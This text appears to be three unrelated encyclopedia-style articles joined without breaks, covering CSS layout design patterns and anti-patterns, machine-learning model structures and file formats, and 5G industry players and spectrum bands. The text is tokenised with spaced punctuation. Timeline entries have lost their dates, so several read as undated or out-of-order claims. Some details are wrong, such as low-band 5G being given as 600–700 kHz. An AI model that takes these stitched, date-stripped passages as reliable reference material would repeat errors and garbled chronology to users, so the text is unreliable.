Rather than memorizing hundreds of rules and their exceptions , it 's more efficient to get familiar with contexts of usage and combinations of properties applicable in those contexts .
This is what CSS design patterns are all about .
Design patterns are common in programming , such as in object - oriented programming .
In HTML / CSS , design patterns are those that work across browsers and devices .
They manage complexity , mitigate code bloat , and improve productivity .
They 're the building blocks that facilitate the creative process : the designer picks known patterns , adjusts them to the current context and combines them for a final result .
What are the design patterns pertaining to the CSS Box Model ?
A few design patterns involving positioning , dimensioning and margins .
Source : Bowers et al .
2011 , ch .
8 - 9 .
Common ways to display an element are ` inline ` , ` inline - block ` and ` block ` .
Special options include ` list - item ` and ` table ` .
We can also take out an element from its normal flow using CSS properties ` position ` and ` float ` .
More sophisticated ways to layout elements include CSS Flexbox , CSS Grid , and CSS Multi - column .
Bowers et al .
talk about three patterns that affect box dimensions : Sizing : manually assign absolute or relative sizes Shrinkwrapping : shrink to fit the content Stretching : stretch to fill its parent container These can be combined with positioning patterns , indenting , offsetting , and aligning .
Specifically , a stretched element can be indented and this affects its dimensions .
A sized or shrinkwrapped element can be offset or aligned without affecting its dimensions .
Much of this is achieved by applying CSS rules to parent and grandparent containers of the element .
These rules mainly specify dimensional properties , positional properties and margins .
What are some traditional CSS patterns for layout design ?
Examples of fluid layouts .
Source : Adapted from Johnson 2019 .
Two patterns are not recommended : fixed - width layouts since measurements are absolute and tables since table cells " ca n't flow " when the viewport changes .
One design pattern is to use columns whose widths adjust to viewport width .
On smaller screens , columns reflow into rows .
This is called fluid layout and is achieved using the properties ` float ` , ` width ` , ` min - width ` and ` max - width ` .
In elastic layout , overall width is set relative to some design elements such as font size .
A hybrid layout is a combination of fixed and fluid / elastic layouts .
Property ` width ` is actually an element 's inner width .
Sometimes we wish to fix the outer width in the design and then adjust the margin , border and padding without affecting the layout .
This is possible by having an element within another element , called outside - in pattern .
The inner element includes margin , border and padding , but the outer element has none .
In fluid layouts , mixing fixed values and percentages is not ideal but ca n't be avoided .
Using percentages is n't possible for borders .
It 's common to use fixed values for margins and padding , and percentages for width .
This problem is solved by the outside - in pattern .
What responsive layout patterns are possible with CSS Flexbox and CSS Grid ?
Four high - level layout patterns identified by Wroblewski .
Source : Adapted from Wroblewski 2012 .
In 2019 , LePage used Flexbox and media queries to implement five layout patterns : Mostly Fluid : On small screens , content reflows and columns stack vertically .
On bigger screens , margins are adjusted .
Column Drop : Columns stack vertically on smaller screens .
Layout Shifter : Content moves around when screen sizes change .
most responsive with many breakpoints but also more complex to maintain .
Tiny Tweaks : Only small changes involving font sizes , image dimensions , or content offsets .
Off Canvas : On smaller screens , less frequently used content is kept off - screen but accessible with a single click .
Rachel Andrew has shared a number of patterns based on CSS Grid .
Typical layouts contain a header , footer , sidebar and a main content area .
An example of a nested grid shows positioning of media along with text and captions .
She also gives examples of using named lines and areas that are easier for developers to work with .
Bryan Robinson has shared a good example of a responsive layout with CSS Grid .
What CSS design patterns help control spaces ?
Behaviour of ' white - space ' property .
Source : MDN web docs 2020a .
CSS gives designers plenty of options to control spaces .
Margin adds space on the outside of an element .
Padding adds space between the element 's border and its content .
For both of these , each boundary ( top , right , bottom , left ) can be individually set .
Negative margins can remove spaces and cause elements to overlap .
In the flow of text , spacing can be controlled with ` letter - spacing ` , ` word - spacing ` , ` line - height ` , and ` text - indent ` .
In addition , ` text - align : justify ` will stretch out inter - word spaces .
Property ` text - indent ` does n't work on inline elements .
For hanging indent , we can use negative ` text - indent ` and positive ` padding - left ` .
Whitespace can be preserved with ` white - space : pre ` , which is useful for displaying code snippets in monospaced font .
To preserve whitespace and also wrap long lines , use ` white - space : pre - wrap ` , ` white - space : pre - line ` , or ` white - space : break - spaces ` .
In addition , ` word - break : break - all ` and ` word - break : break - word ` give more control .
Which are the different categories of CSS design elements ?
CSS design patterns are grouped by UI components .
Source : CodePen 2020 .
Sometimes it 's helpful to think of CSS design patterns in terms of UI components or widgets .
A typical webpage has a header , footer , menu , buttons , breadcrumbs , forms , tables , pagination , etc .
Common ways of using CSS for these purposes can be gathered into CSS patterns .
The page UI Patterns on CodePen documents many such patterns , although some of them are not pure CSS ( they include JavaScript as well ) .
Phuoc 's CSS Layout is another place for CSS patterns .
Close to 100 patterns are featured here under the categories of layout , navigation , input , display , and feedback .
Is it a good idea to adopt a CSS framework ?
CSS frameworks offer a faster route to benefiting from CSS design patterns .
Such frameworks often provide many patterns that can be mixed and matched to achieve an intended design .
They save us the effort of hand - coding dozens of rules .
Well - known frameworks include Bootstrap , Foundation , Bulma , UIkit , Semantic UI , Susy , Materialize , Pure , Skeleton , and Milligram .
Some prefer to choose a small , lightweight framework rather than one that tries to do too many things .
Smaller frameworks and libraries may also be easier to customize .
In any case , be wary of frameworks in which abstractions leak .
Some lightweight frameworks include Pure , Milligram , Picnic , Wing , and Chota .
CSS preprocessors are also useful in managing the complexity of CSS styles .
Features include variables , nesting , mixins , functions and mathematical operations .
Well - known preprocessors include Sass , LESS and Stylus .
These can be compiled into CSS .
In fact , many CSS frameworks make use of preprocessors .
Even when CSS preprocessors are used , developers ca n't sacrifice a solid understanding of CSS .
Preprocessors complement CSS , not replace it .
What are some CSS anti - patterns that I should avoid ?
We note a few CSS anti - patterns : Undoing Styles : Use of ` float : none ` , ` padding:0 ` , or ` border - bottom:0 ` are examples where we 're attempting to undo styles set elsewhere .
It shows that we added styles too early .
Magic / Hard - coded Numbers : These make the design brittle to changes and confusing for other developers .
Examples , ` top:37px ` or ` line - height:32px ` .
The latter could be made relative , such as ` line - height:1.5em ` .
Qualified Selectors : Selector ` ul.nav ` means that style ca n't be reused for navigation menus on other element names .
Selector ` .nav ` is more reusable .
On the flip side , we could have selectors that are too broad , such as ` ul ` .
Instead , I prefer a class selector .
Loose Class Names : Selector ` .card ` does n't suggest its intended purpose .
Instead , ` .credit - card - image ` is better .
Another poorly named selector is ` .teal ` .
It describes a visual attribute and has no semantic value .
Repetitive Key Selectors : The same key selector appearing in many CSS rules suggests poor design .
There 's no single source of truth .
Instead , use BEM convention .
Complex Rules : A rule such as ` .slider { height:27px ; float : left ; } ` is trying to do too many things .
Instead , we could break it up into two separate rules : ` .slider ` and ` .left ` .
At a workshop , Jenifer Tidwell presents Common Ground , a pattern language for human - computer interface design .
She later developed this work and published it as a book titled Designing Interfaces in 2005 .
This is just an example to highlight that CSS design patterns are related to UI patterns .
A simple three - column layout with a top header that works for all browsers is surprising difficult to design .
Owen Briggs builds such a layout and shares his styles online under the title Box Lessons .
In time , this has become a useful reference for many CSS developers .
This is an early example of CSS design patterns .
Holzschlag writes about the constraints of table - based layouts .
She proposes the use of CSS to create more flexible layouts .
CSS enables designers to design for discrete , semantic elements rather than be limited to grid designs .
As a CSS preprocessor , Sass v0.1.0 has been released to help developers manage complex styles .
Subsequently , other preprocessors have been released : LESS v1.0 ( Apr 2010 ) and Stylus v0.02 ( Jan 2011 ) .
Adoption of preprocessors has grown through the 2010s .
A survey from 2016 reveals that about 86 % of respondents use a CSS preprocessor in their development workflow .
Marcotte proposes Fluid Grids as a layout pattern in which all design elements are sized in proportion to font size .
This overcomes the assumption of " minimum screen resolution " and creates fixed layouts .
In later years , this is called elastic layout .
Twitter open source Bootstrap , which is possibly the world 's first framework for frontend - - - - design .
For pragmatic developers who wish to get things done , patterns in Bootstrap speed up development .
Subsequently , Bootstrap 2 ( Jan 2012 ) adds responsive functionality , Bootstrap 3 ( Aug 2013 ) becomes responsive by default and mobile first , Bootstrap 4 ( Jan 2018 ) moves from LESS to Sass and uses CSS Flexbox , and Bootstrap 5 Alpha ( Jun 2020 ) replaces jQuery with vanilla JS and card decks with CSS Grid .
Bowers et al .
publish the book Pro HTML5 and CSS3 Design Patterns .
They describe more than 350 design patterns , each pattern being modular , customizable , and reusable .
Patterns come with working code in HTML and CSS .
Based on a study of layout examples on the Media Queries website , Wroblewski identifies five high - level patterns : Mostly Fluid , Column Drop , Layout Shifter , Tiny Tweaks , and Off Canvas .
Years later , in 2019 , LePage showcases how these patterns can be implemented using CSS Flexbox and media queries .
W3C publishes the first Candidate Recommendation for CSS Flexible Box Layout Module ( first draft in 2009 ) .
In May 2017 , W3C published CSS Grid Layout Module Level 1 as a Candidate Recommendation ( first draft in 2012 ) .
Both Flexbox and Grid greatly simplify CSS rules for layouts .
In time , developers share patterns for these two approaches .
Bob Myers argues that BEM , CSS preprocessors , CSS frameworks , and obsessive separation of content and presentation are all CSS anti - patterns .
CSS engines are faster today than when BEM came out .
Preprocessors complicate building pipelines and require developers to learn their syntax .
Frameworks such as Bootstrap are not needed now for layout when we have CSS Flexbox and CSS Grid .
An ML model or program is the outcome of learning from data .
Source : Advani 2020 .
In traditional programming , a function or program reads a set of input data , processes them and outputs the results .
Machine Learning ( ML ) takes a different approach .
Lots of input data and corresponding outputs are given .
ML employs an algorithm to learn from this dataset and outputs a " function " .
This function or program is what we call an ML Model .
Essentially , the model encapsulates a relationship or pattern that maps the input to the output .
The model learns this automatically without being explicitly programmed with fixed rules or patterns .
The model can then be given unseen data for which it predicts the output .
ML models come in different shapes and formats .
Model metadata and evaluation metrics can help compare different models .
Could you explain ML models with some examples ?
An ML model learns a decision tree to predict house prices .
Source : Shin 2020 .
Consider a function that reads Celsius value and outputs Fahrenheit value .
This implements a simple mathematical formula .
In ML , once the model is trained on the dataset , the formula is implicit in the model .
It can read new Celsius values and give correct Fahrenheit values .
Let 's say we 're trying to estimate house prices based on attributes .
It may be that houses with more than two bedrooms fall into a higher price bracket .
Areas 8500 sq.ft .
and 11500 sq.ft are important thresholds at which prices tend to jump .
Rather than encode these rules into a function , we can build a ML model to learn these rules implicitly .
In another dataset , there are three species of irises .
Each iris sample has four attributes : sepal length / width , petal length / width .
An ML model can be trained to recognize three distinct clusters based on these attributes .
All flowers belonging to a cluster are of the same species .
In all these examples , ML saves us the trouble of writing functions to predict the output .
Instead , we train an ML model to implicitly learn the function .
What are the essentials that help an ML model learn ?
There are many types ( aka shapes / structures / architectures ) of ML models .
Typically , this structure is not selected automatically .
The data scientist pre - selects the structure .
Given data , the model learns within the confines of the chosen structure .
We may say that the model is fine - tuning the parameters of its structure as it sees more and more data .
The model learns in iterations .
Initially , it will make poor predictions , that is , predicted output deviate from actual output .
As it sees more data , it gets better .
Prediction error is quantified by a cost / loss function .
Every model needs such a function to know how well it 's learning and when to stop learning .
The next essential aspect of model training is the optimizer .
It tells the model how to adjust its parameters with each iteration .
Essentially , the optimizer attempts to minimize the loss function .
If results are poor , the data scientist may modify or even select a different structure .
She may pre - process the input differently or focus on certain aspects of the input , called features .
These decisions could be based on experience or analysis of wrong predictions .
What possible structures , loss functions and optimizers are available to train an ML model ?
Some neural network architectures for time series modelling .
Source : Van Kuppevelt et al .
2020 , fig .
1 .
Classical ML offers many possible model structures .
For example , Scikit - Learn has model structures for regression , classification and clustering problems .
Some of these include linear regression , logistic regression , Support Vector Machine ( SVM ) , Stochastic Gradient Descent ( SGD ) , nearest neighbour , Guassian process , Naive Bayes , decision tree , ensemble methods , k - Means , and more .
For building neural networks , many architectures are possible : Feed - Forward Neural Network ( FFNN ) , Convolutional Neural Network ( CNN ) , Recurrent Neural Network ( RNN ) , Gated Recurrent Unit ( GRU ) , Long Short Term Memory ( LSTM ) , Autoencoder , Attention Network , and many more .
In code , these can be built using building blocks such as convolution , pooling , padding , normalization , dropout , linear transforms , non - linear activations , and more .
TensorFlow supports many loss functions : BinaryCrossentropy , CategoricalCrossentropy , CosineSimilarity , KLDivergence , MeanAbsoluteError , MeanSquaredError , Poisson , SquaredHinge , and more .
Among the optimizers are Adadelta , Adagrad , Adam , Adamax , Ftrl , Nadam , RMSprop , and SGD .
What exactly is saved in an ML model ?
An ML model can contain weights , architecture or both .
Source : Janapati 2020 .
ML frameworks typically support different ways to save the model : Only Weights : Weights or parameters represent the model 's current state .
During training , we may wish to save checkpoints .
A checkpoint is a snapshot of the model 's current state .
A checkpoint includes model weights , optimizer state , current epoch and training loss .
For instance , we can create a fresh model and load the weight of a fully trained model .
Only Architecture : Specifies the model 's structure .
If it 's a neural network , there would be details of each layer and how they 're connected .
Data scientists can share model architecture this way , with each one training the model to suit their needs .
Complete Model : This includes model architecture , the weights , optimizer state , and a set of losses and metrics .
In PyTorch , this is less flexible since serialized data is bound to specific classes and directory structure .
In Keras , when saving only weights or the complete model , ` * .tf ` and ` * .h5 ` file formats are applicable .
YAML or JSON , can be used to save architecture .
Which are the formats in which ML models are saved ?
Various ML model formats .
Source : Dowling 2019 .
Open Neural Network Exchange ( ONNX ) is an open format that enables interoperability .
A model in ONNX can be used with various frameworks , tools , runtimes and compilers .
ONNX also makes it easier to access hardware optimizations .
A number of ML frameworks are out there , each saving models in its own format .
TensorFlow saves models as protocol buffer files with the ` * .pb ` extension .
PyTorch saves models with the ` * .pt ` extension .
Keras saves in HDF5 format with ` * .h5 ` extension .
An older XML - based format supported by Scikit - Learn is Predictive Model Markup Language ( PMML ) .
SparkML uses the MLeap format and files are packaged into a ` * .zip ` file .
Apple 's Core ML framework uses the ` * .mlmodel ` file format .
In Python , Scikit - Learn adopts pickled Python objects with the ` * .pkl ` extension .
Joblib with ` * .joblib ` extension is an alternative that 's faster than Pickle for large NumPy arrays .
If XGBoost is used , then a model can be saved in ` * .bst ` , ` * .joblib ` or ` * .pkl ` formats .
With some formats , it 's possible to save not just models but also pipelines composed of multiple models .
Scikit - Learn is an example that can export pipelines in Joblib , Pickle , or PMML formats .
What metadata could be useful along with an ML model ?
An example of ML model metadata .
Source : Google Cloud 2020b .
Data scientists conduct multiple experiments to arrive at a suitable model .
Without metadata and proper management of such metadata , it becomes difficult to reproduce the results and deploy the model into production .
ML metadata also enables us to do auditing , compare models , understand the provenance of artefacts , identify reusable steps for model building , and warn if data distribution in production deviates from training .
To facilitate this , metadata should include model type , types of features , pre - processing steps , hyperparameters , metrics , performance of training / test / validation steps , number of iterations , if early stopping was enabled , training time , and more .
A saved model ( also called exported or serialized model ) , will need to be deserialized when making predictions .
Often , the versions of packages or even the runtime will need to be the same as those during serialization .
Some recommend saving a reference to an immutable version of training data , version of source code that trained the model , versions of libraries and their dependencies , and the cross - validation score .
For reproducible results across platform architectures , it 's a good idea to deploy models within containers , such as Docker .
Which are some useful tools when working with ML models ?
Model visualization in Netron .
Source : Roeder 2020 .
There are tools to visualize an ML model .
Examples include Netron and VisualDL .
These display the model 's computational graph .
We can see data samples , histograms of tensors , precision - recall curves , ROC curves , and more .
These can help us optimize the model better .
Since the ONNX format aids interoperability , there are converters that can convert from other formats to ONNX .
One such tool is ONNXMLTools that supports many formats .
It 's also a wrapper for other converters , such as keras2onnx , tf2onnx and skl2onnx .
The ONNX GitHub code repository lists many more converters .
Many formats can be converted to Apple Core ML 's format using Core ML Tools .
For Android , ` tf.lite .
TFLiteConverter ` converts a Keras model to TFLite .
Sometimes converters are not required .
For example , PyTorch can natively be exported to ONNX .
ONNX models themselves can be simplified and there are optimizers to do this .
ONNX Optimizer is one tool .
The ONNX Simplifier is another , built using ONNX Optimizer .
It basically looks at the whole graph and replaces redundant operators with their constant outputs .
There 's a ready - to - use online version of ONNX Simplifier .
At IBM , Arthur Samuel wrote the first learning program .
Applied to the game of checkers , the program is able to learn from mistakes and improve its gameplay with each new game .
In 1959 , Samuel popularized the term Machine Learning in a paper titled Some Studies in Machine Learning Using the Game of Checkers .
Rumelhart et al .
publish the method of backpropagation and show how it can be used to optimize the weights of neurons in artificial neural networks .
This kindles renewed interest in neural networks .
Although backpropagation was invented in the 1960s and developed by Paul Werbos in 1974 , it was ignored back then due to the general lack of interest in AI .
In this decade , ML has shifted from a knowledge - driven to a data - driven approach .
With the increasing use of statistics and neural networks , ML tackles practical problems rather than the lofty goals of AI .
Also , during the 1990s , Support Vector Machine ( SVM ) emerged as an important ML technique .
Hinton et al .
publish a paper showing how a network of many layers can be trained by smartly initializing the weights .
This paper is later seen as the start of the Deep Learning movement , which is characterized by many layers , lots of training data , parallelized hardware and scalable algorithms .
Subsequently , many DL frameworks have been released , particularly in 2015 .
Vartak et al .
propose ModelDB , a system for ML model management .
Data scientists can use this to compare , explore or analyze models and pipelines .
The system also manages metadata , quality metrics , and even training and test data .
In general , from the mid-2000s we have seen interest in ML model management and platforms .
Examples include Data Version Control ( DVC ) ( 2017 ) , Kubeflow ( 2018 ) , ArangoML Pipeline ( 2019 ) , and TensorFlow Extended ( TFX ) ( 2019 public release ) .
Microsoft and Facebook come together to announce the Open Neural Network Exchange ( ONNX ) .
This is proposed as a common format for ML models .
With ONNX , we obtain framework interoperability ( developers can move their models across frameworks ) and shared optimizations ( hardware vendors and others can target ONNX for optimizations ) .
While there are tools to convert from other formats to ONNX , one ML expert notes some limitations .
For example , ATen operators in PyTorch are not supported in ONNX .
This operator is not standardized in ONNX .
However , it 's possible to still export to ONNX by updating the PyTorch source code , which is something only advanced users are likely to do .
During the inference , ONNX was faster than the PyTorch model format .
Source : Xu and Roy 2020 .
In an image classification task , a performance comparison of ONNX format with PyTorch format shows that ONNX is faster during inference .
Improvements are higher at lower batch sizes .
On another task , ONNX showed as much as 600 % improvement over Scikit - Learn .
Further improvements could be obtained by tuning ONNX for specific hardware .
5 G players are mapped into layers of the 5 G technology stack .
Source : Natarajan et al .
2019 .
5 G is a complex system that involves multiple players fulfilling various roles .
5 G chipset vendors offer 5 G modems and SoCs .
These chipsets are used by mobile device manufacturers and network infrastructure vendors .
Mobile carriers deploy and maintain 5 G networks , often in partnership with infrastructure vendors and handset vendors .
While 5 G infrastructure vendors provide both radio access network and core network equipment , virtualization in 5 G means that network functions can be hosted in the cloud .
Thus , cloud providers play an important role .
From a data perspective , there are CDN providers , data center connectivity vendors , and cloud providers .
Standardization bodies play an essential role in defining what is 5G. They 're complemented by industry bodies that promote 5 G and focus on specific verticals .
Finally , universities and institutes contribute in terms of research , prototyping and training .
Who are the key players in the 5 G ecosystem ?
Key players in the 5 G ecosystem .
Source : Newzoo 2020 .
Without being exhaustive , we note a few players to get a sense of who 's involved : Chipset Vendors : Qualcomm , Samsung , Huawei , MediaTek , Unisoc , Nokia Networks , Intel , Broadcom , etc .
Infrastructure Vendors : Huawei , ZTE , Ericsson , Nokia Networks , Samsung , Cisco , HPE , Dell EMC , etc .
Mobile Device Makers : Apple ( iPhone 12 ) , Google ( Pixel 5 ) , HTC ( mobile hotspot ) , LG ( V50 ThinQ ) , Samsung ( Galaxy 10 5 G ) , Motorola ( G 5 G Plus ) , Huawei ( Mate 20 X ) , Nokia ( Nokia 8.3 ) , Xiaomi ( Mi 10 Pro 5 G ) , OnePlus ( OnePlus 8) , etc .
Mobile Network Operators : Verizon , AT&T , T - Mobile , Vodafone , SK Telecom , China Mobile , etc .
Standardization Bodies : 3GPP , IETF , ITU , and ETSI .
Regulatory Bodies : Government departments and authorities allocate and auction spectrum for 5G. These include FCC ( US ) , DoT ( India ) , CITC ( Saudi Arabia ) , etc .
Industry Bodies : 5GAA , 5G - PPP , 5G - MoNArch , 5 G IA , 5G - ACIA , NGMN Alliance , O - RAN Alliance , IEEE 5 G World Forum , 5 G Future Forum , ONF , BBF , etc .
Cloud Providers : AWS , Google Cloud , Microsoft Azure , Alibaba Cloud , Tencent Cloud , IBM Cloud , etc .
Data Center Colocation Connectivity Providers : China Unicom , Equinix , CoreSite , Digital Realty , CenturyLink , etc .
CDN Providers : Akamai , Cloudflare , Fastly , Limelight Networks , AWS , Google Cloud , Microsoft Azure , etc .
Which are the official standardization bodies for 5 G ?
The main standard bodies for 5 G are : 3GPP : 3GPP defines the 5 G NR specification for 5 G communications .
It also defines standard User Equipment ( UE ) and 5 G Core Network .
IETF : IETF contributes towards routing - related work , traffic engineering , abstractions , network management , deterministic networking , and a new transport protocol named QUIC .
ITU : ITU has a rich history in the development of radio interface standards for mobile communications .
The framework of standards for International Mobile Telecommunications ( IMT ) , encompassing IMT-2000 and IMT - Advanced , spans 3G/4 G industry perspectives and will continue to evolve into 5 G as IMT-2020 .
ETSI : Via Industry Specification Groups ( ISGs ) , ETSI facilitates industry collaboration on topics such as Network Function Virtualization ( NFV ) , Multi - Access Edge Computing ( MEC ) , Microwave Transmission ( mWT ) and Next Generation Protocols ( NGP ) .
Which are some industrial bodies looking at 5 G ?
Industry alliances and consortia tend to focus on specific aspects of 5G. Some of these include the 5 G Automotive Association ( 5GAA ) , 5 G Infrastructure Public Private Partnership ( 5G - PPP ) , 5G - MoNArch , 5 G Infrastructure Association ( 5 G IA ) , 5 G Alliance for Connected Industries and Automation ( 5G - ACIA ) , NGMN Alliance and O - RAN Alliance .
Among the forums and foundations are IEEE 5 G World Forum , 5 G Future Forum ( 5GFF ) , TM Forum , Broadband Forum ( BBF ) and Open Networking Foundation ( ONF ) .
5GAA is an example of an industrial body with a vertical focus .
Involving telecom players and vehicle manufacturers , it seeks to provide end - to - end solutions for future mobility and transportation services .
ONF is led by operators .
It aims to transform network infrastructure and carrier business models through the adoption of network disaggregation , open source software and SDN / NFV .
OpenFlow , ONOS and CORD are some components of an SDN architecture developed by ONF .
BBF is working on a project named 5G - Fixed Mobile Convergence ( 5G - FMC ) .
It concerns mobility and simultaneous access across 3GPP and non-3GPP networks .
Who are the main infrastructure vendors for 5 G ?
Oracle 's offering for 5 G Core .
Source : Oracle 2020 , fig .
1 .
The telecom industry was traditionally limited to a few who specialized in telecom infrastructure .
The equipment was custom - built and expensive .
The main vendors for 5 G are Ericsson , Samsung , Nokia , Huawei , and ZTE , who supply equipment for both RAN and 5 G Core .
5 G Core adopts an open flexible Service - Based Architecture ( SBA ) .
This has enabled new players to enter the industry .
They may not supply RAN equipment ( base stations or antenna arrays ) .
They 're more likely to focus on 5 G Core and edge .
Companies in this category include Cisco , Dell EMC , Hewlett Packard Enterprise , Lenovo , and more .
Cloud providers who 're also in this space include AWS , IBM , Oracle , Microsoft Azure , and Google .
Some acquisitions have happened to build 5 G capability .
For example , HPE acquired Aruba and Silver Peak .
Microsoft acquired Affirmed Networks and Metaswitch .
These companies leverage their expertise in networking , computing , storage and cloud technologies .
They deliver the capability to build 5 G services using AI / ML and SDN / NFV .
Ultimately , a Communications Service Provider ( CSP ) will deploy a variety of components from many vendors to deliver 5 G services .
It 's therefore essential that all components interoperate .
Which are the main 3GPP specifications for 5 G ?
A selection of 5 G specifications .
Source : Keysight Technologies 2019b , slide 9 .
Release 15 technical specifications with a focus on 5 G is available on the 3GPP site .
Excluding technical reports , this is close to 900 documents .
The 5 G New Radio ( NR ) specifications are in the 38 Series .
Specifications that concern both LTE and NR are in the 37 Series .
We note a few high - level specifications to get started : TS 22.261 : Service Requirements , TS 23.501 : System Architecture , TS 37.340 : Multi - connectivity , TS 38.300 : NR and NG - RAN Overall Description , TS 38.401 : NG - RAN Architecture Apart from the 5 G standards , what additional resources are out there to learn more ?
Industry players often publish white papers , blog posts , news articles or explanatory videos to help researchers and the public understand 5 G better .
We note a few of these useful websites : Qualcomm 's 5 G page , Ericsson 's The Voice of 5 G that 's a regular podcast , Nokia 's 5 G Resources page , Intel 's 5 G Resource Center , and Huawei 's 5 G page .
From operators , we have Verizon 's 5 G News and Resources and Vodafone 's 5 G for Business .
GSMA 's 5 G Resources page has white papers and video recordings of webinars .
Keysight Technologies has published a useful glossary of 5 G terms and acronyms .
From the many books on 5 G , we mention two : 5 G New Radio : A Beam - based Air Interface ( 2020 ) and 5 G Core Networks : Powering Digitalization ( 2019 ) .
Qualcomm releases the world 's first 5 G modem in its Snapdragon X50 .
With support for 28GHz mmWave spectrum , it can achieve a top download speed of 5Gbps , 5x faster than the fastest 4 G modems .
Qualcomm dominates the market through the first commercial 5 G deployments in 2019 .
But by the end of 2019 , Samsung ( Exynos 980 ) , MediaTek ( Helio P90 ) and Huawei ( Balong 5000 series ) will emerge as competitors .
3GPP approves the first specifications for 5 G , called " early drop " of Release 15 .
This is followed by " main drop " ( June 2018 ) and " late drop " ( March 2019 ) .
Release 16 comes out in July 2020 .
Partnerships between operators and leading equipment vendors for 5 G trials .
Source : Stratfor 2018 .
Across the world , operators and network vendors partner together and conduct 5 G trials .
In May , Ooredoo Qatar launched the world 's first 5 G network .
Due to the lack of 5 G mobile devices , this is probably with fixed terminals .
A Stratfor research study names Ericsson , Huawei , Nokia , ZTE and Samsung as leaders in telecom equipment .
AT&T , China Mobile , Deutsche Telekom , NTT DOCOMO and Orange jointly created the O - RAN Alliance .
The focus is on defining specifications , leading to a more open , intelligent and interoperable RAN .
The Alliance also supports members in testing their implementations .
In February 2020 , they publish O - RAN Architecture Description 1.0 .
This is followed by many more specifications covering use cases , operations and maintenance , and slicing architecture .
South Korean carriers SK Telecom and KT Corp become the first operators to launch the world 's first commercial 5 G service .
Within an hour later , Verizon launched its own 5 G service in the US in Chicago and Minneapolis .
This is the first time 5 G commercial networks have connected to 5 G smartphones .
5 G smartphones used in these deployments are the Samsung Galaxy S10 5 G and Motorola 's Moto Z3 with 5 G Mod .
At the World Radiocommunication Conference 2019 ( WRC-19 ) , countries supported the harmonization of spectrum for 5G. In particular , 26GHz , 40GHz , and 66GHz are identified .
Under the leadership of ITU , WRC-19 represents good collaboration across countries and industries .
This is essential for the success of 5 G , known within ITU as IMT-2020 .
The next meeting will be WRC-23 in 2023 .
5 G semiconductor market players in December 2019 .
Source : Fieldhack 2020 .
A study by Counterpoint Technology Market Research shows that Qualcomm is one of the few to offer an end - to - end semiconductor portfolio .
Qualcomm offers SoC , modem , RF Front End ( RFFE ) , and antenna technology .
This is also the month when Qualcomm announced the Snapdragon 865 5G. Six operators , América Móvil , KT Corp. , Rogers , Telstra , Verizon , and Vodafone jointly launched the 5 G Future Forum ( 5GFF ) .
Its focus is towards delivery and interoperability of Multi - Access Edge Computing ( MEC ) solutions .
The Forum publishes the first technical specifications for MEC in August ( available to members ) .
A selection of 5 G devices based on Qualcomm Snapdragon .
Source : Qualcomm 2020 , slide 10 .
A presentation from Qualcomm claims that 230 + 5 G devices based on Qualcomm Snapdragon have been launched or in development .
An ecosystem of partners for IBM Cloud for Telecommunications .
Source : Boville and Canepa 2020 .
IBM announces IBM Cloud for Telecommunications that includes 35 + partners .
This highlights the importance of ecosystem and collaboration to deliver a compelling 5 G solution .
Similar partnerships between other cloud providers ( AWS , Google Cloud , Azure ) , operators and equipment vendors were shared by Netmanias in October .
Worldwide allocation of 5 G spectrum as of December 2020 .
Source : Qualcomm 2020a , slide 2 .
The 5 G spectrum spans a wide range from 410 MHz to 52600 MHz .
The high end of the spectrum falls in the millimeter range , which is novel to 5G. With its high bandwidth , it enables high - throughput , ultra - low - latency applications .
Not all frequencies in this range are used by 5G. 5 G defines a number of operating bands within which 5 G services can be offered .
These frequencies have been selected based on suitability and availability .
The bands should not overlap with non-5 G systems such as military , maritime , and satellite communication systems .
Both licensed and unlicensed spectrum can be used in 5G. 5 G can share 4 G 's licensed spectrum and Wi - Fi 's unlicensed spectrum .
A successful worldwide deployment of 5 G requires that countries agree on a common set of bands .
A good agreement was reached in November 2019 at WRC-19 .
Which are the main spectrum bands allocated for 5 G ?
Low , mid and high - band spectra in 5G. Source : Qualcomm 2020a , slide 4 .
The standard defines two frequency ranges : FR1 ( 410 - 7125 MHz ) and FR2 ( 24250 - 52600 MHz ) .
NR operating bands are defined within each range .
While FR1 bands are either in FDD , TDD , SDL or SUL , FR2 bands can operate only in TDD .
Supplementary Downlink ( SDL ) and Supplementary Uplink ( SUL ) are modes that allow only downlink or uplink in those bands .
SDL and SUL are meant to provide additional capacity .
In practice , the industry looks at the 5 G spectrum in terms of low - band ( 600 - 700 kHz ) , mid - band ( 3 - 5 GHz ) and high - band ( 26 - 100 GHz ) .
Others simply refer to FR1 as " sub-6 GHz " band and FR2 as mmWave band .
Specifically , n78 ( 3300 - 3800 MHz ) TDD band is globally harmonized and will be the primary 5 G band .
It 's a subset of n77 ( 3300 - 4200 MHz ) .
How are the 5 G bands and frequencies named or numbered ?
Release 15 5 G operating bands in frequency ranges FR1 and FR2 .
Source : ETSI 2020a , sec .
5.2 .
Operating bands are named with the prefix " n " to signify New Radio .
In Release 16 , FR1 has 49 different bands from n1 to n96 .
FR2 has 5 bands n257-n261 .
In each band , the standard gives identifying numbers to frequencies .
There are two sets of numbers : NR Absolute Radio Frequency Channel Number ( NR - ARFCN ) : Used in signalling to identify reference frequencies .
Channel raster is a subset of reference frequencies used to identify RF channel position in uplink and downlink .
Global Synchronization Channel Number ( GSCN ) : Used for synchronization .
The Synchronization raster is specified by GSCN and indicates frequency positions of the Synchronization Signal Block ( SSB ) .
GSCN has a coarser granularity than NR - ARFCN and , therefore , should enable a UE to do a faster cell search .
Could you describe the 5 G NR channel bandwidth ?
5 G NR channel bandwidth and transmission bandwith .
Source : ETSI 2020b , fig .
5.3.1 - 1 .
Each operating band may have one or more BS channel bandwidths .
Each BS channel bandwidth supports a single RF carrier in UL or DL .
Multiple UE channel bandwidths may be supported within the same BS channel bandwidth .
One or more resource blocks ( RBs ) form an UE channel bandwidth or transmission bandwidth .
Each RB has 12 subcarriers .
Unlike 4 G , where sub - carrier spacing ( SCS ) is fixed to 15 kHz , 5 G NR allows flexible SCS of 15 , 30 or 60 kHz ( FR1 ) ; and 60 or 120 kHz ( FR2 ) .
Guardbands exist at the edges of the BS channel bandwidth .
Standard specifies the minimum guardband for each valid combination of SCS and BS channel bandwidth .
BS channel bandwidth can take values of 5 , 10 , 15 , 20 , 25 , 30 , 40 , 50 , 60 , 70 , 80 , 90 and 100 MHz ( FR1 ) ; and 50 , 100 , 200 and 400 MHz ( FR2 ) .
However , not all values are valid for all bands .
For example , 100MHz in FR1 is valid only for bands n40 , n41 , n77 , n78 , n79 and n90 .
Could you compare the FR1 and FR2 operating bands ?
Comparing FR1 and FR2 operating bands .
Source : Cavazos 2020 , table 2 .
